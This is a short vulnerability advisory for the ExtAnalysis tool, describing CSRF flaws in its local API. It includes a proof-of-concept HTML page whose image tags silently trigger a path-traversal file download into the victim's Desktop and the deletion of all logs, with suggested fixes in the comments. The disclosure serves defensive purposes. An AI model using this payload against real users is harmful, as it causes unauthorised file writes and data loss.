The `ExtAnalysis` project is vulnerable against various CSRFs, that could lead to loss of functionalities and placement of malicious files in arbitrary directories without knowledge of the victim.

## Proof of Concept (Credit: [Mik317](https://huntr.dev/app/users/Mik317))
1. Download the git project and run the server through the `python2 extanalysis.py` command
2. Insert on a malicious host the following code
```html
<html>
<!-- Downloads the Gmass extension in the `Desktop` folder. Fix: avoid `../` + CSRF token -->
<img src="http://127.0.0.1:13337/api/?query=dlanalysis&extid=ehomdgjhgmbidokdgicgmdiedadncbgf&savedir=../../../Desktop/hacked">
<!-- Deletes all the log without knowledge of the victim. Fix: add CSRF token -->
<img src="http://127.0.0.1:13337/api/?query=deleteAll">
</html>
```
## References:
 - [GitHub Issue](https://github.com/Tuhinshubhra/ExtAnalysis/issues/11)
 - [GitHub Permalink #1](https://github.com/Tuhinshubhra/ExtAnalysis/blob/master/frontend/api.py#L43)